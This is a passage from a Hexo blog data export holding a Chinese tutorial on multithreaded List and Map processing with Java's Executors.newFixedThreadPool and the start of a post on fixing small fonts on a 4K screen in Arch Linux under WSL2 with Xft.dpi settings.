}\n```\n\n简单修改一下就能处理 Map 了。\n\n```java\n    /**\n     * 使用 Executors 的 newFixedThreadPool 执行多线程处理 Map 任务\n     *\n     * @param usage\n     * @param map\n     * @param biConsumer\n     * @param <T>\n     */\n    public static <U, T> void fixedThreadPool(String usage, Map<U, T> map, BiConsumer<U, T> biConsumer) {\n        _log.info(usage + \" =>  使用固定大小线程池处理Map开始，线程池大小：\" + threadNum);\n        long startTime = System.currentTimeMillis();\n        ExecutorService executorService = Executors.newFixedThreadPool(threadNum);\n        for (Map.Entry<U, T> entry: map.entrySet()) {\n            // execute：无返回值\n            // submit：返回Future对象\n            executorService.execute(() -> {\n                biConsumer.accept(entry.getKey(), entry.getValue());\n            });\n        }\n        // 停止提交\n        executorService.shutdown();\n        // 阻塞直到所有线程结束\n        while (true) {\n            if (executorService.isTerminated()) {\n                long endTime = System.currentTimeMillis();\n                _log.info(usage + \" =>  使用固定大小线程池处理Map结束，总执行时间：\" + (endTime - startTime) + \"ms\");\n                break;\n            }\n        }\n    }\n```\n\n测试函数：\n\n```java\n    public static void main(String[] args) {\n        List<Integer> list = Arrays.asList(0, 1, 2, 3);\n        fixedThreadPool(\"test list\", list, (index, value) -> {\n            System.out.println(\"index : \" + index + \" -> value : \" + (value + 1));\n        });\n    }\n```\n\n# 总结\n\n为了更通用地使用多线程，所以我写成了这样，并且使用了 `BiConsumer`，这样可以使用两个参数的 consumer，分别是 List 的 index/Map 的 key 和对应的 value，方便处理。\n\n一个很值得注意的问题是如果只是对`List`/`Map`做读取那用什么都可以，但如果涉及到多线程的修改，那么就要使用**线程安全**的类，比如`Vector`和`ConcurrentHashMap`。\n\n简单使用了多线程处理之后，原本十几分钟的处理时间被压缩到一分钟之内，可以说效果显著了，当然也跟之前写的代码实在太 low 有关（现在也一样）。\n\n还测试了自定义线程池的方法，有机会也在后面记录下来。\n","source":"_posts/2022/07/Java多线程之Executors类的newFixedThreadPool方法.md","raw":"---\nlayout: pages\ntitle: Java多线程之Executors类的newFixedThreadPool方法\ndate: 2022-07-27 22:50:33\ntags:\n  - Java\ncategories:\n  - Java\n---\n\n# 前言\n\n做的项目有涉及到读取 Excel 进行批量导入数据，本来是一行行单线程读取，虽然每行有一百多列，数据少的情况下倒没什么问题，但是给业务做测试时发现每次导几千条数据，这时候处理的时间就直接导致 http 请求超时，业务又要求导入数据不符合规范时将错误信息返回给前端，这时候就要想办法优化了，最简单直接的方法是直接上多线程处理。\n\n<!--more-->\n\n# newFixedThreadPool\n\n经过寻求场外协助，知道 Java 有 `Executors` 类的`newFixedThreadPool`方法可以很方便地建立一个固定大小的线程池，加上 bing 的帮助，写了一个多线程处理 List 的方法。\n\n```java\n    /**\n     * 使用 Executors 的 newFixedThreadPool 执行多线程处理 List 任务\n     *\n     * @param usage\n     * @param list\n     * @param biConsumer\n     * @param <T>\n     */\n    public static <T> void fixedThreadPool(String usage, List<T> list, BiConsumer<Integer, T> biConsumer) {\n        _log.info(usage + \" =>  使用固定大小线程池处理List开始，线程池大小：\" + threadNum);\n        long startTime = System.currentTimeMillis();\n        ExecutorService executorService = Executors.newFixedThreadPool(threadNum);\n        int n = 0;\n        for (T value: list) {\n            int index = n++;\n            // execute：无返回值\n            // submit：返回Future对象\n            executorService.execute(() -> {\n                biConsumer.accept(index, value);\n            });\n        }\n        // 停止提交\n        executorService.shutdown();\n        // 阻塞直到所有线程结束\n        while (true) {\n            if (executorService.isTerminated()) {\n                long endTime = System.currentTimeMillis();\n                _log.info(usage + \" =>  使用固定大小线程池处理List结束，总执行时间：\" + (endTime - startTime) + \"ms\");\n                break;\n            }\n        }\n    }\n```\n\n简单修改一下就能处理 Map 了。\n\n```java\n    /**\n     * 使用 Executors 的 newFixedThreadPool 执行多线程处理 Map 任务\n     *\n     * @param usage\n     * @param map\n     * @param biConsumer\n     * @param <T>\n     */\n    public static <U, T> void fixedThreadPool(String usage, Map<U, T> map, BiConsumer<U, T> biConsumer) {\n        _log.info(usage + \" =>  使用固定大小线程池处理Map开始，线程池大小：\" + threadNum);\n        long startTime = System.currentTimeMillis();\n        ExecutorService executorService = Executors.newFixedThreadPool(threadNum);\n        for (Map.Entry<U, T> entry: map.entrySet()) {\n            // execute：无返回值\n            // submit：返回Future对象\n            executorService.execute(() -> {\n                biConsumer.accept(entry.getKey(), entry.getValue());\n            });\n        }\n        // 停止提交\n        executorService.shutdown();\n        // 阻塞直到所有线程结束\n        while (true) {\n            if (executorService.isTerminated()) {\n                long endTime = System.currentTimeMillis();\n                _log.info(usage + \" =>  使用固定大小线程池处理Map结束，总执行时间：\" + (endTime - startTime) + \"ms\");\n                break;\n            }\n        }\n    }\n```\n\n测试函数：\n\n```java\n    public static void main(String[] args) {\n        List<Integer> list = Arrays.asList(0, 1, 2, 3);\n        fixedThreadPool(\"test list\", list, (index, value) -> {\n            System.out.println(\"index : \" + index + \" -> value : \" + (value + 1));\n        });\n    }\n```\n\n# 总结\n\n为了更通用地使用多线程，所以我写成了这样，并且使用了 `BiConsumer`，这样可以使用两个参数的 consumer，分别是 List 的 index/Map 的 key 和对应的 value，方便处理。\n\n一个很值得注意的问题是如果只是对`List`/`Map`做读取那用什么都可以，但如果涉及到多线程的修改，那么就要使用**线程安全**的类，比如`Vector`和`ConcurrentHashMap`。\n\n简单使用了多线程处理之后，原本十几分钟的处理时间被压缩到一分钟之内，可以说效果显著了，当然也跟之前写的代码实在太 low 有关（现在也一样）。\n\n还测试了自定义线程池的方法，有机会也在后面记录下来。\n","slug":"2022/07/Java多线程之Executors类的newFixedThreadPool方法","published":1,"updated":"2022-07-31T16:01:13.771Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj5002fzge33gysh1ex","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>做的项目有涉及到读取 Excel 进行批量导入数据，本来是一行行单线程读取，虽然每行有一百多列，数据少的情况下倒没什么问题，但是给业务做测试时发现每次导几千条数据，这时候处理的时间就直接导致 http 请求超时，业务又要求导入数据不符合规范时将错误信息返回给前端，这时候就要想办法优化了，最简单直接的方法是直接上多线程处理。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"newFixedThreadPool\"><a href=\"#newFixedThreadPool\" class=\"headerlink\" title=\"newFixedThreadPool\"></a>newFixedThreadPool</h1><p>经过寻求场外协助，知道 Java 有 <code>Executors</code> 类的<code>newFixedThreadPool</code>方法可以很方便地建立一个固定大小的线程池，加上 bing 的帮助，写了一个多线程处理 List 的方法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 使用 Executors 的 newFixedThreadPool 执行多线程处理 List 任务</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> usage</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> list</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> biConsumer</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> &lt;T&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; <span class=\"keyword\">void</span> <span class=\"title function_\">fixedThreadPool</span><span class=\"params\">(String usage, List&lt;T&gt; list, BiConsumer&lt;Integer, T&gt; biConsumer)</span> &#123;</span><br><span class=\"line\">    _log.info(usage + <span class=\"string\">&quot; =&gt;  使用固定大小线程池处理List开始，线程池大小：&quot;</span> + threadNum);</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">startTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">    <span class=\"type\">ExecutorService</span> <span class=\"variable\">executorService</span> <span class=\"operator\">=</span> Executors.newFixedThreadPool(threadNum);</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">n</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (T value: list) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">index</span> <span class=\"operator\">=</span> n++;</span><br><span class=\"line\">        <span class=\"comment\">// execute：无返回值</span></span><br><span class=\"line\">        <span class=\"comment\">// submit：返回Future对象</span></span><br><span class=\"line\">        executorService.execute(() -&gt; &#123;</span><br><span class=\"line\">            biConsumer.accept(index, value);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 停止提交</span></span><br><span class=\"line\">    executorService.shutdown();</span><br><span class=\"line\">    <span class=\"comment\">// 阻塞直到所有线程结束</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (executorService.isTerminated()) &#123;</span><br><span class=\"line\">            <span class=\"type\">long</span> <span class=\"variable\">endTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">            _log.info(usage + <span class=\"string\">&quot; =&gt;  使用固定大小线程池处理List结束，总执行时间：&quot;</span> + (endTime - startTime) + <span class=\"string\">&quot;ms&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>简单修改一下就能处理 Map 了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 使用 Executors 的 newFixedThreadPool 执行多线程处理 Map 任务</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> usage</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> map</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> biConsumer</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> &lt;T&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;U, T&gt; <span class=\"keyword\">void</span> <span class=\"title function_\">fixedThreadPool</span><span class=\"params\">(String usage, Map&lt;U, T&gt; map, BiConsumer&lt;U, T&gt; biConsumer)</span> &#123;</span><br><span class=\"line\">    _log.info(usage + <span class=\"string\">&quot; =&gt;  使用固定大小线程池处理Map开始，线程池大小：&quot;</span> + threadNum);</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">startTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">    <span class=\"type\">ExecutorService</span> <span class=\"variable\">executorService</span> <span class=\"operator\">=</span> Executors.newFixedThreadPool(threadNum);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (Map.Entry&lt;U, T&gt; entry: map.entrySet()) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// execute：无返回值</span></span><br><span class=\"line\">        <span class=\"comment\">// submit：返回Future对象</span></span><br><span class=\"line\">        executorService.execute(() -&gt; &#123;</span><br><span class=\"line\">            biConsumer.accept(entry.getKey(), entry.getValue());</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 停止提交</span></span><br><span class=\"line\">    executorService.shutdown();</span><br><span class=\"line\">    <span class=\"comment\">// 阻塞直到所有线程结束</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (executorService.isTerminated()) &#123;</span><br><span class=\"line\">            <span class=\"type\">long</span> <span class=\"variable\">endTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">            _log.info(usage + <span class=\"string\">&quot; =&gt;  使用固定大小线程池处理Map结束，总执行时间：&quot;</span> + (endTime - startTime) + <span class=\"string\">&quot;ms&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>测试函数：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">    List&lt;Integer&gt; list = Arrays.asList(<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\">    fixedThreadPool(<span class=\"string\">&quot;test list&quot;</span>, list, (index, value) -&gt; &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;index : &quot;</span> + index + <span class=\"string\">&quot; -&gt; value : &quot;</span> + (value + <span class=\"number\">1</span>));</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>为了更通用地使用多线程，所以我写成了这样，并且使用了 <code>BiConsumer</code>，这样可以使用两个参数的 consumer，分别是 List 的 index&#x2F;Map 的 key 和对应的 value，方便处理。</p>\n<p>一个很值得注意的问题是如果只是对<code>List</code>&#x2F;<code>Map</code>做读取那用什么都可以，但如果涉及到多线程的修改，那么就要使用<strong>线程安全</strong>的类，比如<code>Vector</code>和<code>ConcurrentHashMap</code>。</p>\n<p>简单使用了多线程处理之后，原本十几分钟的处理时间被压缩到一分钟之内，可以说效果显著了，当然也跟之前写的代码实在太 low 有关（现在也一样）。</p>\n<p>还测试了自定义线程池的方法，有机会也在后面记录下来。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>做的项目有涉及到读取 Excel 进行批量导入数据，本来是一行行单线程读取，虽然每行有一百多列，数据少的情况下倒没什么问题，但是给业务做测试时发现每次导几千条数据，这时候处理的时间就直接导致 http 请求超时，业务又要求导入数据不符合规范时将错误信息返回给前端，这时候就要想办法优化了，最简单直接的方法是直接上多线程处理。</p>","more":"<h1 id=\"newFixedThreadPool\"><a href=\"#newFixedThreadPool\" class=\"headerlink\" title=\"newFixedThreadPool\"></a>newFixedThreadPool</h1><p>经过寻求场外协助，知道 Java 有 <code>Executors</code> 类的<code>newFixedThreadPool</code>方法可以很方便地建立一个固定大小的线程池，加上 bing 的帮助，写了一个多线程处理 List 的方法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 使用 Executors 的 newFixedThreadPool 执行多线程处理 List 任务</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> usage</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> list</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> biConsumer</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> &lt;T&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; <span class=\"keyword\">void</span> <span class=\"title function_\">fixedThreadPool</span><span class=\"params\">(String usage, List&lt;T&gt; list, BiConsumer&lt;Integer, T&gt; biConsumer)</span> &#123;</span><br><span class=\"line\">    _log.info(usage + <span class=\"string\">&quot; =&gt;  使用固定大小线程池处理List开始，线程池大小：&quot;</span> + threadNum);</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">startTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">    <span class=\"type\">ExecutorService</span> <span class=\"variable\">executorService</span> <span class=\"operator\">=</span> Executors.newFixedThreadPool(threadNum);</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">n</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (T value: list) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">index</span> <span class=\"operator\">=</span> n++;</span><br><span class=\"line\">        <span class=\"comment\">// execute：无返回值</span></span><br><span class=\"line\">        <span class=\"comment\">// submit：返回Future对象</span></span><br><span class=\"line\">        executorService.execute(() -&gt; &#123;</span><br><span class=\"line\">            biConsumer.accept(index, value);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 停止提交</span></span><br><span class=\"line\">    executorService.shutdown();</span><br><span class=\"line\">    <span class=\"comment\">// 阻塞直到所有线程结束</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (executorService.isTerminated()) &#123;</span><br><span class=\"line\">            <span class=\"type\">long</span> <span class=\"variable\">endTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">            _log.info(usage + <span class=\"string\">&quot; =&gt;  使用固定大小线程池处理List结束，总执行时间：&quot;</span> + (endTime - startTime) + <span class=\"string\">&quot;ms&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>简单修改一下就能处理 Map 了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 使用 Executors 的 newFixedThreadPool 执行多线程处理 Map 任务</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> usage</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> map</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> biConsumer</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> &lt;T&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;U, T&gt; <span class=\"keyword\">void</span> <span class=\"title function_\">fixedThreadPool</span><span class=\"params\">(String usage, Map&lt;U, T&gt; map, BiConsumer&lt;U, T&gt; biConsumer)</span> &#123;</span><br><span class=\"line\">    _log.info(usage + <span class=\"string\">&quot; =&gt;  使用固定大小线程池处理Map开始，线程池大小：&quot;</span> + threadNum);</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">startTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">    <span class=\"type\">ExecutorService</span> <span class=\"variable\">executorService</span> <span class=\"operator\">=</span> Executors.newFixedThreadPool(threadNum);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (Map.Entry&lt;U, T&gt; entry: map.entrySet()) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// execute：无返回值</span></span><br><span class=\"line\">        <span class=\"comment\">// submit：返回Future对象</span></span><br><span class=\"line\">        executorService.execute(() -&gt; &#123;</span><br><span class=\"line\">            biConsumer.accept(entry.getKey(), entry.getValue());</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 停止提交</span></span><br><span class=\"line\">    executorService.shutdown();</span><br><span class=\"line\">    <span class=\"comment\">// 阻塞直到所有线程结束</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (executorService.isTerminated()) &#123;</span><br><span class=\"line\">            <span class=\"type\">long</span> <span class=\"variable\">endTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">            _log.info(usage + <span class=\"string\">&quot; =&gt;  使用固定大小线程池处理Map结束，总执行时间：&quot;</span> + (endTime - startTime) + <span class=\"string\">&quot;ms&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>测试函数：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">    List&lt;Integer&gt; list = Arrays.asList(<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\">    fixedThreadPool(<span class=\"string\">&quot;test list&quot;</span>, list, (index, value) -&gt; &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;index : &quot;</span> + index + <span class=\"string\">&quot; -&gt; value : &quot;</span> + (value + <span class=\"number\">1</span>));</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>为了更通用地使用多线程，所以我写成了这样，并且使用了 <code>BiConsumer</code>，这样可以使用两个参数的 consumer，分别是 List 的 index&#x2F;Map 的 key 和对应的 value，方便处理。</p>\n<p>一个很值得注意的问题是如果只是对<code>List</code>&#x2F;<code>Map</code>做读取那用什么都可以，但如果涉及到多线程的修改，那么就要使用<strong>线程安全</strong>的类，比如<code>Vector</code>和<code>ConcurrentHashMap</code>。</p>\n<p>简单使用了多线程处理之后，原本十几分钟的处理时间被压缩到一分钟之内，可以说效果显著了，当然也跟之前写的代码实在太 low 有关（现在也一样）。</p>\n<p>还测试了自定义线程池的方法，有机会也在后面记录下来。</p>"},{"layout":"pages","title":"ArchLinux高分屏字体过小解决方案","date":"2022-10-20T15:27:15.000Z","_content":"\n之前通过一系列配置在 wsl2 上安装了桌面并远程连接过去后，发现桌面缩放不对劲，在我的 4k 屏上显示字体非常小，查了好久资料才看到可以通过配置 `X resources` 解决。\n\n<!-- more -->\n\n[Arch Linux - 4k/HiDPI 屏 X Window 字体太小](https://zhuanlan.zhihu.com/p/384806450)\n\n在 `~/.Xresources` 文件上配置如下内容\n\n```\nXft.dpi: 192\n\n! These might also be useful depending on your monitor and personal preference:\nXft.autohint: 0\nXft.lcdfilter:  lcddefault\nXft.hintstyle:  hintfull\nXft.hinting: 1\nXft.antialias: 1\nXft.rgba: rgb\n```\n\n其中 Xft.dpi 尽量为 96 的倍数，以保证最佳显示效果。\n\n之后重启 `X server` 或者直接 reboot。\n\n# 未解决问题\n\n使用的 st 终端字体还是小得跟蚂蚁一样，还需要继续查询解决方案。\n","source":"_posts/2022/10/ArchLinux高分屏字体过小解决方案.md","raw":"---\nlayout: pages\ntitle: ArchLinux高分屏字体过小解决方案\ndate: 2022-10-20 23:27:15\ntags:\n  - 配置\n  - Linux\ncategories:\n  - 配置\n  - Linux\n---\n\n之前通过一系列配置在 wsl2 上安装了桌面并远程连接过去后，发现桌面缩放不对劲，在我的 4k 屏上显示字体非常小，查了好久资料才看到可以通过配置 `X resources` 解决。\n\n<!-- more -->\n\n[Arch Linux - 4k/HiDPI 屏 X Window 字体太小](https://zhuanlan.zhihu.com/p/384806450)\n\n在 `~/.Xresources` 文件上配置如下内容\n\n```\nXft.dpi: 192\n\n! These might also be useful depending on your monitor and personal preference:\nXft.autohint: 0\nXft.lcdfilter:  lcddefault\nXft.hintstyle:  hintfull\nXft.hinting: 1\nXft.antialias: 1\nXft.rgba: rgb\n```\n\n其中 Xft.dpi 尽量为 96 的倍数，以保证最佳显示效果。\n\n之后重启 `X server` 或者直接 reboot。\n\n# 未解决问题\n\n使用的 st 终端字体还是小得跟蚂蚁一样，还需要继续查询解决方案。\n","slug":"2022/10/ArchLinux高分屏字体过小解决方案","published":1,"updated":"2022-10-20T15:36:10.640Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj6002kzge30qzp8tla","content":"<p>之前通过一系列配置在 wsl2 上安装了桌面并远程连接过去后，发现桌面缩放不对劲，在我的 4k 屏上显示字体非常小，查了好久资料才看到可以通过配置 <code>X resources</code> 解决。</p>\n<span id=\"more\"></span>\n\n<p><a href=\"https://zhuanlan.zhihu.com/p/384806450\">Arch Linux - 4k&#x2F;HiDPI 屏 X Window 字体太小</a></p>\n<p>在 <code>~/.Xresources</code> 文件上配置如下内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Xft.dpi: 192</span><br><span class=\"line\"></span><br><span class=\"line\">! These might also be useful depending on your monitor and personal preference:</span><br><span class=\"line\">Xft.autohint: 0</span><br><span class=\"line\">Xft.lcdfilter:  lcddefault</span><br><span class=\"line\">Xft.hintstyle:  hintfull</span><br><span 